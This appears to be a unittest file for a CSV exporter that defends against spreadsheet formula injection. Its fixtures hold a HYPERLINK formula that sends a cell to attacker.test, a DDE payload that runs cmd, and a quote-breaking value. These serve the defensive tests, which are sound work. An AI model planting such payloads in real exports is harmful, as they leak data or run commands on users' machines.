import csv
import io
import unittest
from decimal import Decimal

from solution import (
    cells_a_spreadsheet_would_evaluate,
    naive_export_csv,
    neutralise_cell,
    safe_export_csv,
)

COLUMNS = ["id", "name", "company", "balance"]


def exfiltration_payload() -> str:
    """A HYPERLINK formula that would send cell C2 to an attacker's site."""
    return '=HYPERLINK("https://attacker.test/?d="&C2,"Click for details")'


def customer_rows(name: str) -> list[dict]:
    return [
        {"id": 1, "name": "Asha Rao", "company": "Acme Ltd", "balance": Decimal("120.00")},
        {"id": 2, "name": name, "company": "Globex", "balance": Decimal("-12.50")},
    ]


def parse(csv_text: str) -> list[list[str]]:
    return list(csv.reader(io.StringIO(csv_text)))


class ReproduceProblem(unittest.TestCase):
    def test_naive_export_writes_a_live_formula(self):
        exported = naive_export_csv(COLUMNS, customer_rows(exfiltration_payload()))
        self.assertIn(exfiltration_payload(), cells_a_spreadsheet_would_evaluate(exported))

    def test_naive_export_lets_dde_payload_through(self):
        dde_payload = "@SUM(1+1)*cmd|' /C calc'!A0"
        exported = naive_export_csv(COLUMNS, customer_rows(dde_payload))
        self.assertIn(dde_payload, cells_a_spreadsheet_would_evaluate(exported))


class FixNeutralisesFormulas(unittest.TestCase):
    def test_exported_file_has_no_evaluable_cells(self):
        exported = safe_export_csv(COLUMNS, customer_rows(exfiltration_payload()))
        self.assertEqual(cells_a_spreadsheet_would_evaluate(exported), [])

    def test_every_trigger_character_is_prefixed(self):
        for trigger in ["=", "+", "-", "@", "\t", "\r"]:
            with self.subTest(trigger=repr(trigger)):
                self.assertEqual(neutralise_cell(trigger + "1+1"), "'" + trigger + "1+1")

    def test_payload_text_is_kept_readable_after_the_prefix(self):
        exported = safe_export_csv(COLUMNS, customer_rows(exfiltration_payload()))
        self.assertEqual(parse(exported)[2][1], "'" + exfiltration_payload())

    def test_embedded_quote_cannot_start_a_new_formula_cell(self):
        sneaky_name = 'Bob",=1+1,"'
        exported = safe_export_csv(COLUMNS, customer_rows(sneaky_name))
        second_row = parse(exported)[2]
        self.assertEqual(len(second_row), len(COLUMNS))
        self.assertEqual(second_row[1], sneaky_name)

    def test_formula_after_minus_sign_is_still_dangerous(self):
        self.assertEqual(cells_a_spreadsheet_would_evaluate("-1+cmd|x\n"), ["-1+cmd|x"])

    def test_header_names_are_neutralised_too(self):
        exported = safe_export_csv(["id", "=custom_field"], [{"id": 1}])
        self.assertEqual(parse(exported)[0], ["id", "'=custom_field"])


class FixKeepsNormalDataIntact(unittest.TestCase):
    def test_ordinary_text_is_unchanged(self):
        self.assertEqual(neutralise_cell("Acme Ltd"), "Acme Ltd")

    def test_negative_numbers_stay_numeric(self):
        self.assertEqual(neutralise_cell(Decimal("-12.50")), "-12.50")
        self.assertEqual(neutralise_cell(-3), "-3")

    def test_negative_looking_text_is_still_prefixed(self):
        self.assertEqual(neutralise_cell("-12.50"), "'-12.50")

    def test_none_becomes_empty_cell(self):
        self.assertEqual(neutralise_cell(None), "")

    def test_booleans_are_written_as_text(self):
        self.assertEqual(neutralise_cell(True), "True")

    def test_trigger_character_in_the_middle_is_left_alone(self):
        self.assertEqual(neutralise_cell("jane@example.test"), "jane@example.test")

    def test_missing_column_becomes_empty_cell(self):
        exported = safe_export_csv(["id", "notes"], [{"id": 7}])
        self.assertEqual(parse(exported)[1], ["7", ""])


if __name__ == "__main__":
    unittest.main()
